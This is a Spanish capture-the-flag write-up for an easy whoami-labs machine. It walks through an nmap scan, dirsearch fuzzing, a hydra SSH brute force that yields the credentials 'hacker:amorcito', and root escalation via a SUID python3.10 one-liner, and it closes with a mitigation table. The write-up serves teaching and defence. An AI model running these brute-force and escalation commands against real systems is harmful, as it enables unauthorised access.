## Información General

| Campo | Valor |
|---|---|
| **Plataforma** | whoami-labs |
| **Dificultad** | Fácil |
| **Autor** | elc0ket |

## Técnicas Usadas

Enumeración de servicios, Fuzzing web, Fuerza bruta SSH, Escalada de privilegios mediante binario SUID (`python3.10`).

---

## Fase 1: Reconocimiento y Enumeración

### Escaneo de Puertos con Nmap

```bash
nmap -p- -sS --min-rate 5000 -n -vvv -Pn -oN ports 172.17.0.2
```

![[IMG-20260627163221404.png]]

```bash
nmap -p 21,22,25,3306,5432,6379,8080,8081 -sC -sV -oN allports 172.17.0.2
```

![[IMG-20260627163253899.png]]

### Enumeración Web (Puerto 8080)

```
http://172.17.0.2:8080
```

La página muestra un artículo sobre escalada de privilegios con permisos SUID. El código fuente no revela información relevante.

![[IMG-20260627163337643.png]]

Procedemos a realizar fuzzing con `dirsearch`:

```bash
dirsearch -u http://172.17.0.2:8080/ --exclude-status 403,404,500 -e php,txt,html
```

![[IMG-20260627163412700.png]]

> [!warning] Hallazgo
> Se obtiene el nombre de usuario SSH: `hacker`

![[IMG-20260627163439594.png]]

---

## Fase 2: Acceso Inicial

### Fuerza Bruta SSH con Hydra

```bash
hydra -l hacker -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64 -f
```

![[IMG-20260627163518444.png]]

**Credenciales encontradas:**
- **Usuario:** `hacker`
- **Contraseña:** `amorcito`

### Conexión SSH

```bash
ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '172.17.0.2'
ssh hacker@172.17.0.2
```

![[IMG-20260627163556261.png]]

---

## Fase 3: Escalada de Privilegios

### Enumeración de Binarios SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

Binarios destacados con SUID:

![[IMG-20260627163636581.png]]

### Explotación con `python3.10`

```bash
/usr/bin/python3.10 -c 'import os;os.execl("/bin/bash","bash","-p")'
```

![[IMG-20260627163743124.png]]

### Captura de Flag

```bash
cd /root
```

![[IMG-20260627163813063.png]]

---

## Conclusión

### Resumen del Ataque

| Fase | Acción | Herramienta | Resultado |
|---|---|---|---|
| **1. Reconocimiento** | Escaneo de puertos | `nmap` | 8 puertos abiertos, HTTP en 8080 |
| **2. Enumeración** | Fuzzing web | `dirsearch` | Usuario SSH `hacker` |
| **3. Acceso Inicial** | Fuerza bruta SSH | `hydra` | Credenciales `hacker:amorcito` |
| **4. Escalada** | SUID en `python3.10` | `python3` | Shell como `root` |
| **5. Flag** | Lectura `/root/flag.txt` | `cat` | `1EEME_n0w` |

### Medidas de Mitigación

| Vulnerabilidad | Riesgo | Medida Correctiva |
|---|---|---|
| **Usuario expuesto vía web** | Enumeración de usuarios | No exponer información de usuarios en recursos web públicos |
| **Contraseña débil SSH** | Fuerza bruta | Usar autenticación por clave pública, deshabilitar contraseña (`PasswordAuthentication no`), implementar `fail2ban` |
| **SUID en `python3.10`** | Escalada trivial a root | `chmod u-s /usr/bin/python3.10` — eliminar SUID de intérpretes |
| **Múltiples servicios expuestos** | Superficie de ataque amplia | Deshabilitar servicios no necesarios (SMTP, Redis, MySQL, PostgreSQL sin uso aparente) |

> [!warning] Principio de Mínimo Privilegio
> Intérpretes como `python3`, `vim`, `nano` o `bash` con SUID son vectores de escalada triviales. Nunca deben tener el bit SUID activado.

> [!tip] Referencia
> Consultar [[GTFOBins]] → `python` para más técnicas de explotación SUID.

